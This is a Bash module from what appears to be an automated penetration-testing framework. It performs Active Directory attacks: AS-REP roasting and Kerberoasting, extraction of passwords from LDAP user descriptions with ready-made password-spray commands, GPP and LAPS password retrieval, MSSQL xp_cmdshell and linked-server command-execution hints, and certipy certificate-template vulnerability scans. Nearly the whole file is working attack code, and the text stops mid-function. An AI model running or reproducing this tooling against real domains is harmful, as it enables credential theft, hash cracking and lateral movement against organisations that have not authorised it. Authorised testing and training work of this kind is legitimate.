#!/bin/bash
# MODULE: adcs.sh - ad_attacks_post_validation: delegation, ADCS/certipy, vuln checks

ad_attacks_post_validation() {
    CURRENT_PHASE="PHASE7"
    AD_CONN_ERR_COUNT=0
    AD_CONN_ERR_ABORT=false
    flush_phase_cmds "PHASE 6"

    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  PHASE 7: AD ATTACKS                                      ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"

    # Sla over AD-aanvallen in standalone mode
    if [[ "$STANDALONE" == true ]]; then
        echo -e "${YELLOW}[!] Skipping AD attacks (standalone mode - non-AD target)${NC}"
        echo -e "${YELLOW}[!] AS-REP roasting and Kerberoasting require Active Directory${NC}"
        return
    fi

    # ── Workgroup/non-AD detection ────────────────────────────────────────────
    # If LDAP (389) is not open and the detected "domain" equals the machine name,
    # this is likely a workgroup machine, not real AD. Skip AD attacks.
    local _smb_dc_name=""
    [[ -s "$OUTDIR/smb_domain_detect.txt" ]] &&         _smb_dc_name=$(grep -oiP '\(name:\K[^)]+' "$OUTDIR/smb_domain_detect.txt" | head -1)
    local _smb_domain=""
    [[ -s "$OUTDIR/smb_domain_detect.txt" ]] &&         _smb_domain=$(grep -oiP '\(domain:\K[^)]+' "$OUTDIR/smb_domain_detect.txt" | head -1)
    # Workgroup: domain == machine name OR domain == hostname part of FQDN
    local _ldap_port=${LDAP_PORT_FLAG//--port /}; _ldap_port=${_ldap_port:-389}
    local _ldap_open=false
    [[ -s "$OUTDIR/targets_ldap.txt" ]] && _ldap_open=true
    [[ -s "$OUTDIR/ldap_computers.ldif" ]] && _ldap_open=true
    if [[ "$_ldap_open" == false ]] &&        [[ -n "$_smb_domain" && -n "$_smb_dc_name" ]] &&        [[ "${_smb_domain^^}" == "${_smb_dc_name^^}" ]]; then
        echo -e "${ORANGE}[○] Domain '${_smb_domain}' matches machine name '${_smb_dc_name}' — likely WORKGROUP (not AD)${NC}"
        echo -e "${ORANGE}[○] LDAP port 389 not open — skipping AD-specific attacks${NC}"
        echo -e "${YELLOW}    Use -s (standalone) flag to suppress this check on future scans${NC}"
        return
    fi

    # -------------------------
    # AS-REP ROASTING (additional methods - kerbrute already ran in Phase 2)
    # -------------------------
    echo -e "${CYAN}[*] AS-REP Roasting (additional methods)...${NC}"
    
    # Determine which user list to use for AS-REP
    local ASREP_USERS=""
    if [[ -s "$OUTDIR/users_all_formats.txt" ]]; then
        ASREP_USERS="$OUTDIR/users_all_formats.txt"
    elif [[ -s "$OUTDIR/users_validated.txt" ]]; then
        ASREP_USERS="$OUTDIR/users_validated.txt"
    fi
    
    # Method 1: impacket-GetNPUsers — explicit -dc-ip is the most reliable approach.
    # Always runs before nxc to ensure we get results even if nxc has KDC resolution issues.
    # NOTE: No -outputfile — hashes print to terminal (white) so they are never missed.
    if command -v impacket-GetNPUsers &> /dev/null && [[ -n "$DOMAIN" && -n "$DC_IP" ]]; then
        # Ensure domain resolves
        if ! getent hosts "$DOMAIN" &>/dev/null; then
            echo "$DC_IP    $DOMAIN" | sudo tee -a /etc/hosts >/dev/null
        fi
        echo -e "${CYAN}    impacket-GetNPUsers (anonymous LDAP enum — finds ALL pre-auth-disabled accounts)...${NC}"
        run_cmd "impacket-GetNPUsers '$DOMAIN/' -dc-ip '$DC_IP' -request -format hashcat 2>/dev/null" "$OUTDIR/asrep_ldap_enum.txt"

        if [[ -s "$ASREP_USERS" ]]; then
            echo -e "${CYAN}    impacket-GetNPUsers (user list: $(wc -l < "$ASREP_USERS" 2>/dev/null || echo 0) users)...${NC}"
            run_cmd "impacket-GetNPUsers '$DOMAIN/' -usersfile '$ASREP_USERS' -dc-ip '$DC_IP' -format hashcat 2>/dev/null" "$OUTDIR/asrep_impacket.txt"
        fi
    fi

    # Method 2: nxc ldap --asreproast — use DC_IP directly (NOT $TARGET_ARG or targets_ldap.txt)
    # Using $TARGET_ARG causes nxc to contact Kerberos on the wrong host (known nxc bug:
    # it tries port 88 on the first host from the file regardless of domain config).
    if [[ -s "$ASREP_USERS" && -n "$DC_IP" ]]; then
        echo -e "${CYAN}    nxc ldap --asreproast (DC_IP=$DC_IP, explicit to avoid KDC bug)...${NC}"
        run_cmd "sudo nxc ldap '$DC_IP' $LDAP_PORT_FLAG -u '$ASREP_USERS' -p '' --asreproast '$OUTDIR/asrep_nxc.txt' 2>/dev/null"
    fi

    # Reset connection error counter — nxc KDC/port-88 errors during AS-REP are expected
    # (nxc may still try the wrong Kerberos host despite explicit DC_IP). Do NOT let these
    # errors block Kerberoasting which uses impacket-GetUserSPNs with explicit -dc-ip.
    ad_reset_err_count 2>/dev/null || { AD_CONN_ERR_COUNT=0; AD_CONN_ERR_ABORT=false; }
    
    # Consolidate AS-REP results from ALL sources (kerbrute from Phase 2 + nxc + impacket)
    cat "$OUTDIR"/asrep*.txt 2>/dev/null | grep -v "^$" | grep '^\$krb5asrep\$' | sort -u > "$OUTDIR/asrep_all.txt"
    
    if [[ -s "$OUTDIR/asrep_all.txt" ]]; then
        # Create individual hash files per user AND hash type
        while read -r hash; do
            local username=$(echo "$hash" | grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+')
            local hashtype=$(echo "$hash" | grep -oP '\$krb5asrep\$\K[0-9]+')
            
            if [[ -n "$username" && -n "$hashtype" ]]; then
                local hashtype_name="rc4"
                [[ "$hashtype" == "18" ]] && hashtype_name="aes"
                
                local hashfile="$OUTDIR/${username}_${hashtype_name}.hash"
                echo "$hash" > "$hashfile"
                echo -e "${GREEN}[+] Saved: $hashfile${NC}"
            fi
        done < "$OUTDIR/asrep_all.txt"
        
        # Combined file (ontdubbel by user, prefer RC4)
        awk -F'[$@]' '!seen[$4]++' "$OUTDIR/asrep_all.txt" > "$OUTDIR/asrep.txt"
        
        local asrep_count=$(wc -l < "$OUTDIR/asrep_all.txt")
        local unique_users=$(grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+' "$OUTDIR/asrep_all.txt" 2>/dev/null | sort -u | wc -l)
        local asrep_users=$(grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+' "$OUTDIR/asrep_all.txt" 2>/dev/null | sort -u | tr '\n' ' ')
        
        echo -e "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
        printf "${GREEN}║  AS-REP HASHES FOUND: %d hash(es) for %d user(s)%-16s║${NC}\n" "$asrep_count" "$unique_users" ""
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
        echo -e "${GREEN}[+] Users: $asrep_users${NC}"
        
        local aes_count=$(grep -c '\$krb5asrep\$18\$' "$OUTDIR/asrep_all.txt" 2>/dev/null || echo "0")
        local rc4_count=$(grep -c '\$krb5asrep\$23\$' "$OUTDIR/asrep_all.txt" 2>/dev/null || echo "0")
        
        [[ "$aes_count" -gt 0 ]] 2>/dev/null && echo -e "${YELLOW}[!] AES hashes (\$18): $aes_count - hashcat -m 19900${NC}"
        [[ "$rc4_count" -gt 0 ]] 2>/dev/null && echo -e "${YELLOW}[!] RC4 hashes (\$23): $rc4_count - hashcat -m 18200 (faster!)${NC}"
        
        grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+' "$OUTDIR/asrep_all.txt" 2>/dev/null | sort -u >> "$ENUM_USERS"
    fi
    echo ""

    # -------------------------
    # AUTHENTICATED AD-AANVALLEN (if we have creds)
    # -------------------------
    if [[ -s "$CREDS_FILE" ]]; then
        local first_cred=$(head -1 "$CREDS_FILE")
        IFS='|' read -r proto ip domain user secret pwned cred_type access_info <<< "$first_cred"

        # Reset error counter — AS-REP KDC errors must NOT carry over to Kerberoasting
        AD_CONN_ERR_COUNT=0; AD_CONN_ERR_ABORT=false

        echo -e "\n${GREEN}[+] Authenticated as: ${WHITE}${domain:+$domain\\}$user${NC}  ${GRAY}($cred_type)${NC}"

        local AUTH_ARGS
        [[ "$cred_type" == "hash" ]] && AUTH_ARGS="-u '$user' -H '$secret'" || AUTH_ARGS="-u '$user' -p '$secret'"

        # Detect if --local-auth is needed for SMB modules.
        # When domain auth fails but local-auth works, the CREDS_FILE stores the machine
        # hostname (e.g. MS01) as the domain instead of the AD domain (e.g. oscp.exam).
        # Detect this by comparing the stored domain to the known AD DOMAIN.
        local SMB_LOCAL_AUTH=""
        if [[ -n "$domain" && -n "$DOMAIN" && "${domain,,}" != "${DOMAIN,,}" && "$domain" != *"."* ]]; then
            SMB_LOCAL_AUTH="--local-auth"
            echo -e "${YELLOW}[*] Credential domain '${domain}' != AD domain '${DOMAIN}' — using --local-auth for SMB modules${NC}"
        fi

        # Ensure domain resolves for Kerberos (impacket needs this for TGS requests)
        if [[ -n "$DOMAIN" && -n "$DC_IP" ]]; then
            if ! getent hosts "$DOMAIN" &>/dev/null; then
                echo -e "${YELLOW}[*] Adding $DOMAIN to /etc/hosts for Kerberos resolution...${NC}"
                echo "$DC_IP    $DOMAIN" | sudo tee -a /etc/hosts >/dev/null
            fi
        fi

        echo -e "\n${CYAN}[*] Kerberoasting...${NC}"

        # Methode 1: Impacket GetUserSPNs (meest betrouwbaar - uses -dc-ip properly)
        if command -v impacket-GetUserSPNs &> /dev/null && [[ -n "$DOMAIN" && -n "$DC_IP" ]]; then
            echo -e "${CYAN}    impacket-GetUserSPNs...${NC}"
            if [[ "$cred_type" == "hash" ]]; then
                run_cmd "impacket-GetUserSPNs '$DOMAIN/$user' -hashes ':$secret' -dc-ip '$DC_IP' -request" "$OUTDIR/kerberoast_impacket.txt"
            else
                run_cmd "impacket-GetUserSPNs '$DOMAIN/$user:$secret' -dc-ip '$DC_IP' -request" "$OUTDIR/kerberoast_impacket.txt"
            fi
        elif command -v GetUserSPNs.py &> /dev/null && [[ -n "$DOMAIN" && -n "$DC_IP" ]]; then
            echo -e "${CYAN}    GetUserSPNs.py...${NC}"
            if [[ "$cred_type" == "hash" ]]; then
                run_cmd "GetUserSPNs.py '$DOMAIN/$user' -hashes ':$secret' -dc-ip '$DC_IP' -request" "$OUTDIR/kerberoast_impacket.txt"
            else
                run_cmd "GetUserSPNs.py '$DOMAIN/$user:$secret' -dc-ip '$DC_IP' -request" "$OUTDIR/kerberoast_impacket.txt"
            fi
        fi
        
        # Method 2: nxc ldap --kerberoasting — use DC_IP directly (same KDC-host fix as AS-REP)
        echo -e "${CYAN}    nxc ldap --kerberoasting (DC_IP=$DC_IP)...${NC}"
        [[ -n "$DC_IP" ]] && run_cmd "sudo nxc ldap '$DC_IP' $LDAP_PORT_FLAG $AUTH_ARGS --kerberoasting '$OUTDIR/kerberoast_nxc.txt'"
        
        # Consolidate kerberoast results from all methods
        cat "$OUTDIR"/kerberoast_*.txt 2>/dev/null | grep -v "^$" | grep '^\$krb5tgs\$' | sort -u > "$OUTDIR/kerberoast.txt"
        
        [[ -s "$OUTDIR/kerberoast.txt" ]] && {
            local kerb_count=$(wc -l < "$OUTDIR/kerberoast.txt")
            local kerb_users=$(grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$]+' "$OUTDIR/kerberoast.txt" 2>/dev/null | sort -u | tr '\n' ' ')
            local unique_users=$(grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$]+' "$OUTDIR/kerberoast.txt" 2>/dev/null | sort -u | wc -l)
            echo -e "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║   KERBEROAST HASH(ES) CAPTURED!                           ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
            echo -e "${GREEN}[+] Kerberoastable accounts ($unique_users): $kerb_users${NC}"
            echo -e "${GREEN}[+] Hash count: $kerb_count${NC}"
            echo -e "${CYAN}[*] Hash file: $OUTDIR/kerberoast.txt${NC}"
            echo ""
            # Display each hash in white for visibility
            while IFS= read -r hash; do
                echo -e "${WHITE}$hash${NC}"
            done < "$OUTDIR/kerberoast.txt"
            echo ""
            echo -e "${YELLOW}[+] Crack with: hashcat -m 13100 $OUTDIR/kerberoast.txt /usr/share/wordlists/rockyou.txt${NC}"
        }

        echo -e "\n${YELLOW}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║    USER DESCRIPTIONS (often contain passwords!)           ║${NC}"
        echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════╝${NC}"
        if [[ "$SKIP_DESC_USERS" != "true" ]]; then
            run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS -M get-desc-users" "$OUTDIR/user_descriptions.txt"
        else
            echo -e "${YELLOW}[!] Skipping LDAP description harvest (--skip-desc-users)${NC}"
        fi
        
        # Highlight any password-related content
        if grep -qiE "pass|pwd|cred|wachtwoord|secret" "$OUTDIR/user_descriptions.txt" 2>/dev/null; then
            echo -e "\n${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
            echo -e "${RED}║   POSSIBLE PASSWORD IN DESCRIPTION!                       ║${NC}"
            echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
            grep -iE "pass|pwd|cred|wachtwoord|secret" "$OUTDIR/user_descriptions.txt" 2>/dev/null | while read -r line; do
                # Haal user and description
                local desc_user=$(echo "$line" | grep -oP 'User:\s*\K[^\s]+')
                local desc_text=$(echo "$line" | grep -oP 'description:\s*\K.*')
                if [[ -n "$desc_user" && -n "$desc_text" ]]; then
                    echo -e "${WHITE}    User: $desc_user${NC}"
                    echo -e "${WHITE}    Desc: $desc_text${NC}"
                    # Try to haal password from description
                    local extracted_pass=$(echo "$desc_text" | grep -oP '(?:password|pass|pwd)\s+(?:is\s+)?\K\S+' 2>/dev/null | head -1)
                    if [[ -n "$extracted_pass" ]]; then
                        echo -e "${RED}    >>> EXTRACTED PASSWORD: $desc_user : $extracted_pass${NC}"
                        echo "$extracted_pass" >> "$OUTDIR/passwords_from_desc.txt"
                        echo -e "${RED}    → Spray this immediately:${NC}"
                        echo -e "${WHITE}    >> sudo nxc smb $TARGET_ARG -u '$desc_user' -p '$extracted_pass' --continue-on-success${NC}"
                        echo -e "${GRAY}    >> sudo nxc smb $TARGET_ARG -u '$OUTDIR/all_users_clean.txt' -p '$extracted_pass' --continue-on-success${NC}"
                        echo -e "${GRAY}    >> sudo nxc smb $TARGET_ARG -u '$OUTDIR/all_users_clean.txt' -p '$extracted_pass' --local-auth --continue-on-success${NC}"
                    fi
                    echo ""
                fi
            done
        fi

        # --users always runs: populates confirmed_users.txt needed for re-spraying
        echo -e "\n${CYAN}[*] Domain users (authenticated LDAP)...${NC}"
        run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --users" "$OUTDIR/domain_users.txt"
        export_users_from_nxc_domain_users "$OUTDIR/domain_users.txt"

        # impacket-GetADUsers: covers different attributes than nxc --users
        # Runs in all modes — fast, lightweight single LDAP query.
        if command -v impacket-GetADUsers &>/dev/null && [[ -n "$DOMAIN" && -n "$DC_IP" ]]; then
            echo -e "\n${CYAN}[*] impacket-GetADUsers (full AD user list with last-logon/disabled flags)...${NC}"
            if [[ "$cred_type" == "hash" ]]; then
                run_cmd "impacket-GetADUsers '$DOMAIN/$user' -hashes ':$secret' -dc-ip '$DC_IP' -all" "$OUTDIR/ad_users_impacket.txt"
            else
                run_cmd "impacket-GetADUsers '$DOMAIN/$user:$secret' -dc-ip '$DC_IP' -all" "$OUTDIR/ad_users_impacket.txt"
            fi
            if [[ -s "$OUTDIR/ad_users_impacket.txt" ]]; then
                # Parse SAMAccountName column (col 1) — skip header/separator lines
                grep -vE '^-+|^Name|^$|Impacket|Copyright' "$OUTDIR/ad_users_impacket.txt" 2>/dev/null \
                    | awk '{print $1}' | grep -v '^$' | sort -u >> "$OUTDIR/confirmed_users.txt" 2>/dev/null
                sort -u "$OUTDIR/confirmed_users.txt" -o "$OUTDIR/confirmed_users.txt" 2>/dev/null
                local _gadu_count
                _gadu_count=$(grep -cvE '^-+|^Name|^$|Impacket|Copyright' "$OUTDIR/ad_users_impacket.txt" 2>/dev/null || echo 0)
                echo -e "${GREEN}[+] GetADUsers: ${_gadu_count} accounts (merged into confirmed_users.txt)${NC}"
            fi
        fi

        # --computers and --groups are slow (full LDAP page walk) — skip in fast mode
        if [[ "$SKIP_ENUM" == true && "$RUN_EXTRAS" != true ]]; then
            echo -e "${GRAY}[>] Domain computers  [SKIPPED -f] copy/paste to run manually:${NC}"
            echo -e "${GRAY}    >> sudo nxc ldap targets.txt $LDAP_PORT_FLAG $AUTH_ARGS --computers${NC}"
            echo -e "${GRAY}[>] Domain groups     [SKIPPED -f] copy/paste to run manually:${NC}"
            echo -e "${GRAY}    >> sudo nxc ldap targets.txt $LDAP_PORT_FLAG $AUTH_ARGS --groups${NC}"
        else
            echo -e "\n${CYAN}[*] Domain computers...${NC}"
            run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --computers" "$OUTDIR/domain_computers.txt"
            if [[ -s "$OUTDIR/domain_computers.txt" ]]; then
                local comp_count=$(grep -c '\[+\]' "$OUTDIR/domain_computers.txt" 2>/dev/null || echo 0)
                [[ $comp_count -gt 0 ]] && echo -e "${GREEN}[+] Found $comp_count domain computers${NC}"
            fi

            echo -e "\n${CYAN}[*] Domain groups...${NC}"
            run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --groups" "$OUTDIR/domain_groups.txt"
        fi

        if [[ "$SKIP_ENUM" != true ]]; then
            echo -e "\n${CYAN}[*] LDAP whoami (current user context)...${NC}"
            run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS -M whoami" "$OUTDIR/ldap_whoami.txt"
        else
            echo -e "${GRAY}[*] LDAP whoami skipped (fast mode — run manually: nxc ldap $TARGET_ARG $AUTH_ARGS -M whoami)${NC}"
        fi

        echo -e "\n${CYAN}[*] Trusted for delegation (quick scan)...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
            run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --trusted-for-delegation" "$OUTDIR/delegation.txt"
            # Colour-code nxc delegation output: DC accounts are expected (orange), others are red
            if [[ -s "$OUTDIR/delegation.txt" ]]; then
                local _dc_short="${DOMAIN%%.*}"
                while IFS= read -r _td_line; do
                    local _td_acc; _td_acc=$(echo "$_td_line" | grep -oiP 'TRUSTED.*: \K\S+' | head -1)
                    [[ -z "$_td_acc" ]] && echo -e "${GRAY}$_td_line${NC}" && continue
                    if [[ "${_td_acc^^}" == "${_dc_short^^}\$" || "${_td_acc^^}" == "${_dc_short^^}" ]]; then
                        echo -e "${ORANGE}[○] $_td_acc — DC machine account (unconstrained expected, see impacket section below)${NC}"
                    else
                        echo -e "${RED}[!] $_td_acc — non-DC trusted for delegation → potential TGT capture path${NC}"
                    fi
                done < <(grep -iE "trusted|TRUSTED" "$OUTDIR/delegation.txt" 2>/dev/null)
            fi
        else
            show_skipped_extra "--trusted-for-delegation" "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --trusted-for-delegation"
        fi

        echo -e "\n${CYAN}[*] AdminCount users...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --admin-count" "$OUTDIR/admin_count.txt"
        else
            show_skipped_extra "--admin-count" "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --admin-count"
        fi

        echo -e "\n${CYAN}[*] Machine Account Quota...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
            run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS -M maq" "$OUTDIR/maq.txt"
        else
            show_skipped_extra "-M maq" "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS -M maq"
        fi

        echo -e "\n${CYAN}[*] Password not required (PASSWD_NOTREQD)...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
            run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --password-not-required" "$OUTDIR/passwd_not_required.txt"
            # Cross-reference with adminCount=1 users from ldap dump — those are RED
            if [[ -s "$OUTDIR/passwd_not_required.txt" ]]; then
                local _notreq_count=0
                local _notreq_priv_count=0
                while IFS= read -r _pnr_line; do
                    _pnr_user=$(echo "$_pnr_line" | grep -oiP 'User:\s*\K\S+')
                    [[ -z "$_pnr_user" ]] && continue
                    (( _notreq_count++ ))
                    # Check if this user has adminCount=1 in our ldap dump
                    if grep -q "sAMAccountName: ${_pnr_user}$" "$OUTDIR/ldap_users.ldif" 2>/dev/null; then
                        local _pnr_admin=$(awk -v u="${_pnr_user}" '
                            /^sAMAccountName:/ && $2==u {found=1}
                            found && /^adminCount:/ && $2=="1" {print "admin"; exit}
                            /^$/ {found=0}
                        ' "$OUTDIR/ldap_users.ldif" 2>/dev/null)
                        if [[ "$_pnr_admin" == "admin" ]]; then
                            echo -e "${RED}  [!] PRIVILEGED account with no password required: ${_pnr_user}${NC}"
                            echo -e "${RED}      → Can authenticate with empty password (try: nxc smb $TARGET_ARG -u '$_pnr_user' -p '')${NC}"
                            (( _notreq_priv_count++ ))
                        fi
                    fi
                done < <(grep -i "User:.*Status: enabled" "$OUTDIR/passwd_not_required.txt" 2>/dev/null)
                if [[ $_notreq_count -gt 3 && $_notreq_priv_count -eq 0 ]]; then
                    echo -e "${ORANGE}[○] ${_notreq_count} accounts have PASSWD_NOTREQD (mostly staff) — no privileged accounts flagged${NC}"
                    echo -e "${ORANGE}    → These can auth with empty password; worth spraying but lower priority${NC}"
                    echo -e "${GRAY}    >> sudo nxc smb $TARGET_ARG -u '$OUTDIR/all_users_clean.txt' -p '' --continue-on-success${NC}"
                fi
            fi
        else
            show_skipped_extra "--password-not-required" "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS --password-not-required"
        fi

        echo -e "\n${CYAN}[*] GPP Passwords...${NC}"
        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M gpp_password" "$OUTDIR/gpp_passwords.txt"
        run_cmd "sudo nxc smb $TARGET_ARG $AUTH_ARGS $SMB_LOCAL_AUTH -M gpp_autologin" "$OUTDIR/gpp_autologin.txt"

        echo -e "\n${CYAN}[*] LAPS passwords...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS -M laps" "$OUTDIR/laps.txt"
        else
            show_skipped_extra "-M laps" "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS -M laps"
        fi

        # -------------------------
        # MSSQL AUTHENTICATED ENUMERATION
        # Run if MSSQL port is open - try both Windows auth (default) AND SQL auth (--local-auth).
        # Key insight: accounts that fail Windows auth may succeed with SQL auth.
        # NXC --local-auth on MSSQL = SQL Server auth (same as impacket-mssqlclient WITHOUT -windows-auth).
        # -------------------------
        if [[ -s "$OUTDIR/targets_mssql.txt" ]]; then
            echo -e "\n${CYAN}[*] MSSQL - Privilege check (mssql_priv module)...${NC}"
            echo -e "${YELLOW}    Checks: SA role, db_owner, impersonation, xp_cmdshell${NC}"
            if [[ "$RUN_EXTRAS" == true ]]; then
                run_cmd "sudo nxc mssql $TARGET_ARG $AUTH_ARGS -M mssql_priv" "$OUTDIR/mssql_priv.txt"
                # CRITICAL: also try SQL auth (--local-auth) - bypasses Windows/Kerberos auth issues
                run_cmd "sudo nxc mssql $TARGET_ARG $AUTH_ARGS --local-auth -M mssql_priv" "$OUTDIR/mssql_priv_sqlauth.txt"
            else
                show_skipped_extra "-M mssql_priv" "sudo nxc mssql $TARGET_ARG $AUTH_ARGS -M mssql_priv"
                show_skipped_extra "-M mssql_priv (SQL auth)" "sudo nxc mssql $TARGET_ARG $AUTH_ARGS --local-auth -M mssql_priv"
            fi
            if grep -qiE "IsAdmin|SA role|sysadmin|xp_cmdshell|EXEC" "$OUTDIR/mssql_priv.txt" "$OUTDIR/mssql_priv_sqlauth.txt" 2>/dev/null; then
                echo -e "${RED}[!] MSSQL privilege escalation opportunity found! Check mssql_priv*.txt${NC}"
            fi

            echo -e "\n${CYAN}[*] MSSQL - xp_cmdshell status check...${NC}"
            if [[ "$RUN_EXTRAS" == true ]]; then
                run_cmd "sudo nxc mssql $TARGET_ARG $AUTH_ARGS -q \"SELECT name, CAST(value_in_use AS INT) AS enabled FROM sys.configurations WHERE name = 'xp_cmdshell';\"" "$OUTDIR/mssql_xpcmdshell.txt"
                run_cmd "sudo nxc mssql $TARGET_ARG $AUTH_ARGS --local-auth -q \"SELECT name, CAST(value_in_use AS INT) AS enabled FROM sys.configurations WHERE name = 'xp_cmdshell';\"" "$OUTDIR/mssql_xpcmdshell_sqlauth.txt"
            else
                show_skipped_extra "mssql xp_cmdshell check" "sudo nxc mssql $TARGET_ARG $AUTH_ARGS -q \"SELECT name,CAST(value_in_use AS INT) FROM sys.configurations WHERE name='xp_cmdshell';\""
            fi
            if grep -qi " 1$\| 1 " "$OUTDIR/mssql_xpcmdshell.txt" "$OUTDIR/mssql_xpcmdshell_sqlauth.txt" 2>/dev/null; then
                echo -e "${RED}[!] xp_cmdshell ENABLED! RCE possible:${NC}"
                echo -e "${GRAY}    >> nxc mssql $TARGET_ARG $AUTH_ARGS -x 'whoami'${NC}"
                echo -e "${GRAY}    >> nxc mssql $TARGET_ARG $AUTH_ARGS --local-auth -x 'whoami'${NC}"
            fi

            echo -e "\n${CYAN}[*] MSSQL - Linked servers (lateral movement)...${NC}"
            if [[ "$RUN_EXTRAS" == true ]]; then
                run_cmd "sudo nxc mssql $TARGET_ARG $AUTH_ARGS -q \"SELECT name, product, provider, data_source FROM sys.servers WHERE server_id > 0;\"" "$OUTDIR/mssql_linked_servers.txt"
                run_cmd "sudo nxc mssql $TARGET_ARG $AUTH_ARGS --local-auth -q \"SELECT name, product, provider, data_source FROM sys.servers WHERE server_id > 0;\"" "$OUTDIR/mssql_linked_servers_sqlauth.txt"
            else
                show_skipped_extra "mssql linked servers" "sudo nxc mssql $TARGET_ARG $AUTH_ARGS -q \"SELECT name FROM sys.servers WHERE server_id > 0;\""
            fi
            if grep -qv "^$" "$OUTDIR/mssql_linked_servers.txt" "$OUTDIR/mssql_linked_servers_sqlauth.txt" 2>/dev/null; then
                echo -e "${RED}[!] Linked MSSQL servers found - potential lateral movement target!${NC}"
                echo -e "${GRAY}    >> exec('xp_cmdshell ''whoami''') AT [linked_server_name]${NC}"
            fi

            echo -e "\n${CYAN}[*] MSSQL - whoami / current user / role...${NC}"
            if [[ "$RUN_EXTRAS" == true ]]; then
                run_cmd "sudo nxc mssql $TARGET_ARG $AUTH_ARGS -q \"SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');\"" "$OUTDIR/mssql_whoami.txt"
                run_cmd "sudo nxc mssql $TARGET_ARG $AUTH_ARGS --local-auth -q \"SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');\"" "$OUTDIR/mssql_whoami_sqlauth.txt"
            else
                show_skipped_extra "mssql whoami" "sudo nxc mssql $TARGET_ARG $AUTH_ARGS -q \"SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');\""
            fi

            echo -e "\n${CYAN}[*] MSSQL - Database list...${NC}"
            if [[ "$RUN_EXTRAS" == true ]]; then
                run_cmd "sudo nxc mssql $TARGET_ARG $AUTH_ARGS -q \"SELECT name, database_id, create_date FROM sys.databases;\"" "$OUTDIR/mssql_databases.txt"
                run_cmd "sudo nxc mssql $TARGET_ARG $AUTH_ARGS --local-auth -q \"SELECT name, database_id, create_date FROM sys.databases;\"" "$OUTDIR/mssql_databases_sqlauth.txt"
            else
                show_skipped_extra "mssql databases" "sudo nxc mssql $TARGET_ARG $AUTH_ARGS -q \"SELECT name FROM sys.databases;\""
            fi
        fi

        echo -e "\n${CYAN}[*] ADCS check...${NC}"
        if [[ "$RUN_EXTRAS" == true ]]; then
        run_cmd "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS -M adcs" "$OUTDIR/adcs.txt"
        else
            show_skipped_extra "-M adcs" "sudo nxc ldap $TARGET_ARG $LDAP_PORT_FLAG $AUTH_ARGS -M adcs"
        fi
        
        # Certipy - Full ESC1-ESC16 vulnerability check
        if command -v certipy-ad &> /dev/null && [[ -n "$DOMAIN" && -n "$DC_IP" ]]; then
            echo -e "\n${CYAN}[*] Certipy ESC1-ESC16 vulnerability check...${NC}"
            if [[ "$RUN_EXTRAS" == true ]]; then
                if [[ "$cred_type" == "hash" ]]; then
                    run_cmd "certipy-ad find -u '$user@$DOMAIN' -hashes ':$secret' -dc-ip '$DC_IP' -vulnerable -enabled -stdout" "$OUTDIR/certipy_vulnerable.txt"
                else
                    run_cmd "certipy-ad find -u '$user@$DOMAIN' -p '$secret' -dc-ip '$DC_IP' -vulnerable -enabled -stdout" "$OUTDIR/certipy_vulnerable.txt"
                fi
            else
                show_skipped_extra "certipy-ad find -vulnerable -enabled -stdout" \
                    "certipy-ad find -u '$user@$DOMAIN' -p '$secret' -dc-ip '$DC_IP' -vulnerable -enabled -stdout"
            fi

            # Parse certipy output for CA name and vulnerable templates
            local _certipy_ca _certipy_template _certipy_cred
            _certipy_ca=$(grep -oiP "CA Name\s*:\s*\K.+" "$OUTDIR/certipy_vulnerable.txt" 2>/dev/null | head -1 | xargs)
            _certipy_template=$(grep -oiP "Template Name\s*:\s*\K.+" "$OUTDIR/certipy_vulnerable.txt" 2>/dev/null | head -1 | xargs)
